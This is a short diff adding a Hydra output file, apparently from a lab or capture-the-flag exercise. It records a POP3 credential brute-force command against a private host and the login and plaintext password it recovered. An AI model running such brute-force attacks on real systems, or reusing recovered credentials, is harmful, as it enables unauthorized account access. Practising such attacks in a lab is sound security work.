@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-02-18 15:39:40 on 10.10.101.18 pop3 (hydra -C poss_creds.txt -o pop_pass.txt pop3://10.10.101.18)
+[110][pop3] host: 10.10.101.18   login: seina   password: scoobydoo2
